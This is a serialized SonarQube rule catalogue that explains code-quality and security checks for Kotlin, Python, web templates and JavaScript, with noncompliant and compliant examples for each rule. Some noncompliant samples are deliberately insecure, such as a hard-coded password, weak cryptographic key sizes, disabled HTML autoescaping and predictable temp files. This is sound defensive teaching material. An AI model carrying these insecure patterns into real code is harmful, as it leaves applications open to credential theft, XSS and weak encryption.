 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
ﬂ
kotlin:S2068Œ
kotlinS2068$Credentials should not be hard-coded"BLOCKER*kotlin:ˆ<p>Because it is easy to extract strings from a compiled application, credentials should never be hard-coded. Do so, and they're almost guaranteed to
end up in the hands of an attacker. This is particularly true for applications that are distributed.</p>
<p>Credentials should be stored outside of the code in a strongly-protected encrypted configuration file or database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
val params = "password=xxxx" // Noncompliant
val writer = OutputStreamWriter(getOutputStream())
writer.write(params)
writer.flush()
...
val password = "xxxx" // Noncompliant
...
</pre>
<h2>Compliant Solution</h2>
<pre>
val params = "password=${retrievePassword()}"
val writer = OutputStreamWriter(getOutputStream())
writer.write(params)
writer.flush()
...
val password = retrievePassword()
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
  <li> OWASP Top 10 2017 Category A2 - Broken Authentication </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>ZVULNERABILITY
Ú
python:BackticksUsageÿ
pythonBackticksUsageBackticks should not be used"BLOCKER*py:Ü<p>Backticks are a deprecated alias for <code>repr()</code>. Don't use them any more, the syntax was removed in Python 3.0.</p>
<h2>Noncompliant Code Example</h2>
<pre>
return `num`  # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
return repr(num)
</pre>Z
CODE_SMELL
¬
python:S3516±
pythonS3516)Functions returns should not be invariant"BLOCKER*py:€<p>When a function is designed to return an invariant value, it may be poor design, but it shouldn't adversely affect the outcome of your program.
However, when it happens on all paths through the logic, it is surely a bug.</p>
<p>This rule raises an issue when a function contains several return statements that all return the same value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(a):  # NonCompliant
    b = 12
    if a == 1:
        return b
    return b
</pre>Z
CODE_SMELL
π
python:S2711®
pythonS27119"yield" and "return" should not be used outside functions"BLOCKER*py:…<p><code>yield</code> and <code>return</code> only make sense in the context of functions. Using them outside a function raises a
<code>SyntaxError</code>. To break out of a loop, use <code>break</code> instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass:
    while True:
        return False #Noncompliant
</pre>ZBUG
ì
python:S2712Ç
pythonS2712<"return" and "yield" should not be used in the same function"BLOCKER*py:†<p>Functions that use <code>yield</code> are known as "generators", and generators cannot <code>return</code> values. Similarly, functions that use
<code>return</code> cannot use <code>yield</code>. Doing so will cause a <code>SyntaxError</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def adder(n):
     num = 0
     while num &lt; n:
         yield num
         num += 1
     return num  #Noncompliant
</pre>ZBUG
„
python:ExecStatementUsage≈
pythonExecStatementUsage'The "exec" statement should not be used"BLOCKER*py:‰<p>Use of the <code>exec</code> statement could be dangerous, and should be avoided. Moreover, the <code>exec</code> statement was removed in Python
3.0. Instead, the built-in <code>exec()</code> function can be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
exec 'print 1' # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
exec('print 1')
</pre>Z
CODE_SMELL
ë
python:S2190Ä
pythonS2190 Recursion should not be infinite"BLOCKER*py:∫<p>Recursion happens when control enters a loop that has no exit. This can happen when a method invokes itself or when a pair of methods invoke each
other. It can be a useful tool, but unless the method includes a provision to break out of the recursion and <code>return</code>, the recursion will
continue until the stack overflows and the program crashes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def my_pow(num, exponent):  # Noncompliant
    num = num * my_pow(num, exponent - 1)
    return num  # this is never reached
</pre>
<h2>Compliant Solution</h2>
<pre>
def my_pow(num, exponent):  # Compliant
    if exponent &gt; 1:
      num = num * my_pow(num, exponent - 1)
    return num
</pre>ZBUG
”
python:S4426¬
pythonS4426ACryptographic key generation should be based on strong parameters"BLOCKER*py:—<p>When generating cryptographic keys (or key pairs), it is important to use strong parameters. Key length, for instance, should provides enough
entropy against brute-force attacks. </p>
<ul>
  <li> For <code>RSA</code> and <code>DSA</code> algorithms key size should be at least 2048 bits long </li>
  <li> For <code>ECC</code> (elliptic curve cryptography) algorithms key size should be at least 224 bits long </li>
  <li> For <code>RSA</code> public key exponent should be at least 65537. </li>
</ul>
<p>This rule raises an issue when an <code>RSA</code>, <code>DSA</code> or <code>ECC</code> key-pair generator is initialized using weak parameters.
</p>
<p>It supports the following libraries:</p>
<ul>
  <li> <a href="https://github.com/pyca/cryptography">cryptography</a> </li>
  <li> <a href="https://github.com/dlitz/pycrypto">PyCrypto</a> </li>
  <li> <a href="https://github.com/Legrandin/pycryptodome">Cryptodome</a> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
from cryptography.hazmat.primitives.asymmetric import rsa, ec, dsa

dsa.generate_private_key(key_size=1024, backend=backend) # Noncompliant
rsa.generate_private_key(public_exponent=999, key_size=2048, backend=backend) # Noncompliant
ec.generate_private_key(curve=ec.SECT163R2, backend=backend)  # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
from cryptography.hazmat.primitives.asymmetric import rsa, ec, dsa

dsa.generate_private_key(key_size=2048, backend=backend) # Compliant
rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=backend) # Compliant
ec.generate_private_key(curve=ec.SECT409R1, backend=backend) # Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
  Misconfiguration </li>
  <li> <a href="https://www.ssi.gouv.fr/uploads/2014/11/RGS_v-2-0_B1.pdf">ANSSI RGSv2</a> - R√©f√©rentiel G√©n√©ral de S√©curit√© version 2 </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf">NIST FIPS 186-4</a> - Digital Signature Standard (DSS) </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
</ul>ZVULNERABILITY
«
python:S5439∂
pythonS54399HTML autoescape mechanism should not be globally disabled"BLOCKER*py:Õ<p>Template engines have an HTML autoescape mechanism that protects web applications against most common cross-site-scripting (XSS)
vulnerabilities.</p>
<p>By default, it automatically replaces HTML special characters in any template variables. This secure by design configuration should not be globally
disabled.</p>
<p>Escaping HTML from template variables prevents switching into any execution context, like <code>&lt;script&gt;</code>. Disabling autoescaping
forces developers to manually escape each template variable for the application to be safe. A more pragmatic approach is to escape by default and to
manually disable escaping when needed.</p>
<p>A successful exploitation of a cross-site-scripting vulnerability by an attacker allow him to execute malicious JavaScript code in a user's web
browser. The most severe XSS attacks involve:</p>
<ul>
  <li> Forced redirection </li>
  <li> Modify presentation of content </li>
  <li> User accounts takeover after disclosure of sensitive information like session cookies or passwords </li>
</ul>
<p>This rule supports the following libraries:</p>
<ul>
  <li> <a href="https://github.com/django/django">Django Templates</a> </li>
  <li> <a href="https://github.com/pallets/jinja">Jinja2</a> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
from jinja2 import Environment

env = Environment() # Noncompliant; New Jinja2 Environment has autoescape set to false
env = Environment(autoescape=False) # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
from jinja2 import Environment
env = Environment(autoescape=True) # Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site Scripting
  (XSS) </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/79.html">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/80.html">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/81.html">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/82.html">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/83.html">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/84.html">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/85.html">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/86.html">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/87.html">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>ZVULNERABILITY
∫
python:S5445©
pythonS5445<Insecure temporary files creation methods should not be used"BLOCKER*py:Ω<p>Creating temporary files using insecure methods exposes the application to race conditions on filenames: a malicious user can try to create a file
with a predictable name before the application does. A successful attack can result in other files being accessed, modified, corrupted or deleted.
This risk is even higher if the application run with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-1858">CVE-2014-1858</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-1932">CVE-2014-1932</a> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import tempfile

filename = tempfile.mktemp() # Noncompliant
tmp_file = open(filename, "w+")
</pre>
<h2>Compliant Solution</h2>
<pre>
import tempfile

tmp_file1 = tempfile.NamedTemporaryFile(delete=False) # Compliant; Easy replacement to tempfile.mktemp()
tmp_file2 = tempfile.NamedTemporaryFile() # Compliant; Created file will be automatically deleted
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">OWASP Top 10 2017 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/377">MITRE, CWE-377</a> - Insecure Temporary File </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/379">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li>
  <li> <a href="https://www.owasp.org/index.php/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
  <li> <a href="https://docs.python.org/3/library/tempfile.html#deprecated-functions-and-variables">Python tempfile module</a> </li>
  <li> <a href="https://docs.python.org/2.7/library/os.html">Python 2.7 os module</a> </li>
</ul>ZVULNERABILITY
¬
python:S1845±
pythonS1845@Methods and field names should not differ only by capitalization"BLOCKER*py:ƒ<p>Looking at the set of methods and fields in a <code>class</code> and finding two that differ only by capitalization is confusing to users of the
class.</p>
<p>This situation may simply indicate poor naming. Method names should be action-oriented, and thus contain a verb, which is unlikely in the case
where both a method and a field have the same name (with or without capitalization differences). However, renaming a public method could be disruptive
to callers. Therefore renaming the member is the recommended action.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class SomeClass:
    lookUp = false
    def lookup():       # Non-compliant; method name differs from field name only by capitalization
        pass
</pre>
<h2>Compliant Solution</h2>
<pre>
class SomeClass:
    lookUp = false
    def getLookUp():
        pass
</pre>Z
CODE_SMELL
Ø
python:S3827û
pythonS3827DVariables, classes and functions should be defined before being used"BLOCKER*py:¥<p>Variables, Classes and functions should be defined before they are used, otherwise the code will fail.</p>
<h2>Noncompliant Code Example</h2>
<pre>
unknown_var  # Noncompliant (variable is never defined)

def noncompliant():
    foo()  # Noncompliant
    foo = sum

    func()  # Noncompliant
    def func():
        pass

    MyClass()  # Noncompliant
    class MyClass:
        pass
</pre>
<h2>Compliant Solution</h2>
<pre>
def compliant():
    foo = sum
    foo()

    def func():
        pass
    func()

    class MyClass:
        pass
    MyClass()
</pre>ZBUG
Ú
python:S2733·
pythonS2733="__exit__" should accept type, value, and traceback arguments"BLOCKER*py:˛<p>The <code>__exit__</code> method is invoked with four arguments: self, type, value and traceback. Leave one of these out of the method declaration
and the result will be a <code>TypeError</code> at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass:
   def __enter__(self):
       pass
   def __exit__(self, exc_type, exc_val):  # Noncompliant
       pass
</pre>ZBUG
Æ
python:S2734ù
pythonS2734$"__init__" should not return a value"BLOCKER*py:”<p>By contract, every Python function returns something, even if it's the <code>None</code> value, which can be returned implicitly by omitting the
<code>return</code> statement, or explicitly. </p>
<p>The <code>__init__</code> method is required to return <code>None</code>. A <code>TypeError</code> will be raised if the <code>__init__</code>
method either <code>yield</code>s or <code>return</code>s any expression other than <code>None</code>. Returning some expression that evaluates to
<code>None</code> will not raise an error, but is considered bad practice.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass(object):
    def __init__(self):
        self.message = 'Hello'
        return self  # Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass(object):
    def __init__(self):
        self.message = 'Hello'
</pre>ZBUG
í
	Web:S5148Ñ
WebS5148:Links with "target=_blank" should prevent phishing attacks"BLOCKER*web:ú<p>When a link opens a URL in a new tab with <code>target="_blank"</code>, it is very simple for the opened page to change the <code>location</code>
of the original page because the JavaScript variable <code>window.opener</code> is not <code>null</code> and thus <code>"window.opener.location</code>
can be set by the opened page. This exposes the user to very simple phishing attacks.</p>
<p>Imagine a link posted on a comment of a popular web site (say: <a href="http://petssocialnetwork.io/">http://petssocialnetwork.io/</a>) that opens
a new tab that changes the URL of the original page to <a href="http://petssocialnetwork-pishing.io/">http://petssocialnetwork-pishing.io/</a>. On
"http://petssocialnetwork-pishing.io/" you land at a fake login page similar to the one at "http://petssocialnetwork.io/" but controlled by the hacker
and asking the user to log in again, pretending that the session just timed-out.</p>
<p>To prevent pages from abusing <code>window.opener</code>, use <code>rel=noopener</code> on <code>&lt;a href=&gt;</code> to force its value to be
<code>null</code> on the opened pages. With this in place, <code>window.opener</code> is <code>null</code> in Chrome 49+, Opera 36+, Firefox 52+,
Desktop Safari 10.1+, and iOS Safari 10.3+. For older browsers, use "noreferrer". Cumulatively, <code>rel="noopener noreferrer"</code> is the safest
way to mitigate this vulnerability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;a href="http://dangerouswebsite.com" target="_blank"&gt; &lt;!-- Noncompliant; "window.opener" will be not null on the new tab/window and can be changed by http://dangerouswebsite.com --&gt;

&lt;a href="http://dangerouswebsite.com" target="_blank" rel="noopener"&gt; &lt;!-- Noncompliant; will not prevent the attack on old browsers --&gt;

&lt;a href="{{variable}}" target="_blank" rel="noopener"&gt; &lt;!-- Noncompliant  --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;a href="http://dangerouswebsite.com" target="_blank" rel="noopener noreferrer"&gt; &lt;!-- Compliant --&gt;
</pre>
<h2>Exceptions</h2>
<p>No Issue will be raised when <code>href</code> contains a hardcoded relative url as there it has less chances of being vulnerable. An url is
considered hardcoded and relative if it doesn't start with <code>http://</code> or <code>https://</code>, and if it does not contain any of the
characters {}$()[]</p>
<pre>
&lt;a href="internal.html" target="_blank" &gt; &lt;!-- Compliant --&gt;
</pre>
<h2>See</h2>
<p> * <a href="https://mathiasbynens.github.io/rel-noopener/">https://mathiasbynens.github.io/rel-noopener/</a></p>ZVULNERABILITY
ü
Web:IllegalTagLibsCheckÉ
WebIllegalTagLibsCheck'Disallowed "taglibs" should not be used"BLOCKER*web:£<p>This rule checks that the disallowed tag libraries are not used.</p>
<h2>Noncompliant Code Example</h2>
<p>Using the default parameter for this rule, "http://java.sun.com/jstl/sql":</p>
<pre>
&lt;%@ taglib uri="http://java.sun.com/jstl/sql" prefix="prefixOfTag" &gt; &lt;!-- Noncompliant --&gt;
&lt;jsp:directive.taglib uri="http://java.sun.com/jstl/sql" prefix="prefixOfTag" /&gt; &lt;!-- Noncompliant --&gt;
</pre>Z
CODE_SMELL
¸	
Web:HeaderCheckË	
WebHeaderCheck+Track lack of copyright and license headers"BLOCKER*web:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
ª
Web:LibraryDependencyCheckú
WebLibraryDependencyCheck=Some Java packages or classes should not be used in JSP files"BLOCKER*web:°<p>This rule raises an issue when a configured Java package or class is used in a JSP file.</p>
<h2>Noncompliant Code Example</h2>
<p>Given a disallowed list of <code>java.sql,ArrayList</code>:</p>
<pre>
&lt;%@ page import="java.sql.*" %&gt;     &lt;!-- Noncompliant --&gt;
&lt;% java.util.ArrayList clients; %&gt;  &lt;!-- Noncompliant --&gt;
&lt;% java.lang.String name; %&gt;        &lt;!-- Compliant --&gt;
</pre>@Z
CODE_SMELL
⁄
javascript:S3796≈

javascriptS37968Callbacks of array methods should have return statements"BLOCKER*js:„<p>Arrays in JavaScript have several methods for filtering, mapping or folding that require a callback. Not having a return statement in such a
callback function is most likely a mistake.</p>
<p>This rule applies for the following methods of an array:</p>
<ul>
  <li> <code>Array.from</code> </li>
  <li> <code>Array.prototype.every</code> </li>
  <li> <code>Array.prototype.filter</code> </li>
  <li> <code>Array.prototype.find</code> </li>
  <li> <code>Array.prototype.findIndex</code> </li>
  <li> <code>Array.prototype.map</code> </li>
  <li> <code>Array.prototype.reduce</code> </li>
  <li> <code>Array.prototype.reduceRight</code> </li>
  <li> <code>Array.prototype.some</code> </li>
  <li> <code>Array.prototype.sort</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var merged = arr.reduce(function(a, b) {
  a.concat(b);
}); // Noncompliant: No return statement
</pre>
<h2>Compliant Solution</h2>
<pre>
var merged = arr.reduce(function(a, b) {
  return a.concat(b);
});
</pre>ZBUG
ã
javascript:OctalNumber

javascriptOctalNumberOctal values should not be used"BLOCKER*js:ö<p>Integer literals starting with a zero are octal rather than decimal values. While using octal values is fully supported, most developers do not
have experience with them. They may not recognize octal values as such, mistaking them instead for decimal values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var myNumber = 010;   // Noncompliant. myNumber will hold 8, not 10 - was this really expected?
</pre>
<h2>Compliant Solution</h2>
<pre>
var myNumber = 8;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_QC7AQ">CERT, DCL18-C.</a> - Do not begin integer constants with 0 when specifying a
  decimal value </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/hYClBg">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>Z
CODE_SMELL
◊
javascript:S2703¬

javascriptS2703'Variables should be declared explicitly"BLOCKER*js:Í<p>JavaScript variable scope can be particularly difficult to understand and get right. The situation gets even worse when you consider the
<em>accidental</em> creation of global variables, which is what happens when you declare a variable inside a function or the <code>for</code> clause
of a for-loop without using the <code>let</code>, <code>const</code> or <code>var</code> keywords. </p>
<p><code>let</code> and <code>const</code> were introduced in ECMAScript 2015, and are now the preferred keywords for variable declaration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function f(){
  i = 1;         // Noncompliant; i is global

  for (j = 0; j &lt; array.length; j++) {  // Noncompliant; j is global now too
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function f(){
  var i = 1;

  for (let j = 0; j &lt; array.length; j++) {
    // ...
  }
}
</pre>Z
CODE_SMELL
∆
javascript:S2817±

javascriptS2817$Web SQL databases should not be used"BLOCKER*js:Ÿ<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">OWASP Top 10 2017 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
</ul>ZVULNERABILITY
á
javascript:S2189Ú


javascriptS2189Loops should not be infinite"BLOCKER*js:¨
<p>An infinite loop is one that will never end while the program is running, i.e., you have to kill the program to get out of the loop. Whether it is
by meeting the loop's end condition or via a <code>break</code>, every loop should have an end condition.</p>
<h3>Known Limitations</h3>
<ul>
  <li> False positives: when <code>yield</code> is used - <a href="https://github.com/SonarSource/SonarJS/issues/674">Issue #674</a>. </li>
  <li> False positives: when an exception is raised by a function invoked within the loop. </li>
  <li> False negatives: when a loop condition is based on an element of an array or object. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
for (;;) {  // Noncompliant; end condition omitted
  // ...
}

var j = 0;
while (true) { // Noncompliant; constant end condition
  j++;
}

var k;
var b = true;
while (b) { // Noncompliant; constant end condition
  k++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>

while (true) { // break will potentially allow leaving the loop
  if (someCondition) {
    break;
  }
}

var k;
var b = true;
while (b) {
  k++;
  b = k &lt; 10;
}

outer:
while(true) {
  while(true) {
    break outer;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PYHfAw">CERT, MSC01-J.</a> - Do not use an empty infinite loop </li>
</ul>ZBUG
œ

javascript:FutureReservedWords¨


javascriptFutureReservedWords9"future reserved words" should not be used as identifiers"BLOCKER*js:¥	<p>The following words may be used as keywords in future evolutions of the language, so using them as identifiers should be avoided to allow an easier
adoption of those potential future versions:</p>
<ul>
  <li> <code>await</code> </li>
  <li> <code>class</code> </li>
  <li> <code>const</code> </li>
  <li> <code>enum</code> </li>
  <li> <code>export</code> </li>
  <li> <code>extends</code> </li>
  <li> <code>implements</code> </li>
  <li> <code>import</code> </li>
  <li> <code>interface</code> </li>
  <li> <code>let</code> </li>
  <li> <code>package</code> </li>
  <li> <code>private</code> </li>
  <li> <code>protected</code> </li>
  <li> <code>public</code> </li>
  <li> <code>static</code> </li>
  <li> <code>super</code> </li>
  <li> <code>yield</code> </li>
</ul>
<p>Use of these words as identifiers would produce an error in JavaScript <code>strict</code> mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var package = document.getElementsByName("foo"); // Noncompliant
var someData = { package: true };                 // Compliant, as it is not used as an identifier here
</pre>
<h2>Compliant Solution</h2>
<pre>
var elements = document.getElementsByName("foo"); // Compliant
</pre>Z
CODE_SMELL
Œ
javascript:S3828π

javascriptS38289"yield" expressions should not be used outside generators"BLOCKER*js:÷<p>The <code>yield</code> keyword is used in a generator function to return an <code>IteratorResult</code> to the caller. It has no other purpose, and
if found outside such a function will raise a <code>ReferenceError</code> because it is then treated as an identifier.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  for (var i = 0; i &lt; 5; i++) {
    yield i * 2;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function * foo() {
  for (var i = 0; i &lt; 5; i++) {
    yield i * 2;
  }
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
Ì
javascript:S1526ÿ

javascriptS1526EVariables declared with "var" should be declared before they are used"BLOCKER*js:‚<p>Variables declared with <code>var</code> have the special property that regardless of where they're declared in a function they "float" to the top
of the function and are available for use even before they're declared. That makes scoping confusing, especially for new coders. </p>
<p>To keep confusion to a minimum, <code>var</code> declarations should happen before they are used for the first time.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var x = 1;

function fun(){
  alert(x); // Noncompliant as x is declared later in the same scope
  if(something) {
    var x = 42; // Declaration in function scope (not block scope!) shadows global variable
  }
}

fun(); // Unexpectedly alerts "undefined" instead of "1"
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = 1;

function fun() {
  print(x);
  if (something) {
    x = 42;
  }
}

fun(); // Print "1"
</pre>Z
CODE_SMELL
¿

javascript:S3827´


javascriptS3827-Variables should be defined before being used"BLOCKER*js:‘	<p>When a non-existent variable is referenced a <code>ReferenceError</code> is raised.</p>
<p>Due to the dynamic nature of JavaScript this can happen in a number of scenarios:</p>
<ul>
  <li> When typo was made in a symbol's name. </li>
  <li> When using variable declared with <code>let</code> or <code>const</code> before declaration (unlike <code>var</code>-declarations, they are not
  hoisted to the top of the scope). </li>
  <li> Due to confusion with scopes of <code>let</code>- and <code>const</code>-declarations (they have block scope, unlike
  <code>var</code>-declarations, having function scope). </li>
  <li> When accessing a property in the wrong scope (e.g. forgetting to specify <code>this.</code>). </li>
</ul>
<p>This rule does not raise issues on global variables which are defined with <code>sonar.javascript.globals</code> and
<code>sonar.javascript.environments</code> properties.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var john = {
  firstName: "john",
  show: function() { console.log(firstName); } // Noncompliant: firstName is not defined
}
john.show();
</pre>
<h2>Compliant Solution</h2>
<pre>
var john = {
  firstName: "john",
  show: function() { console.log(this.firstName); }
}
john.show();
</pre>ZBUG
Î	
javascript:S1219÷	

javascriptS12196"switch" statements should not contain non-case labels"BLOCKER*js:Ô<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing
error.</p>
<h2>Noncompliant Code Example</h2>
<p>Case 1, the code is syntactically correct but the behavior is not the expected one</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  WEDNESDAY:   // instead of "case WEDNESDAY"
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2, the code is correct and behaves as expected but is hardly readable </p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    foo:for(i = 0 ; i &lt; X ; i++) {
         /* ... */
        break foo;  // this break statement doesn't relate to the nesting case TUESDAY
         /* ... */
    }
    break;
    /* ... */
}
</pre>
<h2>Compliant Solution</h2>
<p>Case 1</p>
<pre>
switch (day) {
  case MONDAY:
  case TUESDAY:
  case WEDNESDAY:
    doSomething();
    break;
  ...
}
</pre>
<p>Case 2</p>
<pre>
switch (day) {
  case MONDAY:
    break;
  case TUESDAY:
    compute(args); // put the content of the labelled "for" statement in a dedicated method
    break;

    /* ... */
}
</pre>Z
CODE_SMELL
˝	
javascript:S1451Ë	

javascriptS1451+Track lack of copyright and license headers"BLOCKER*js:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
‚
javascript:S3516Õ

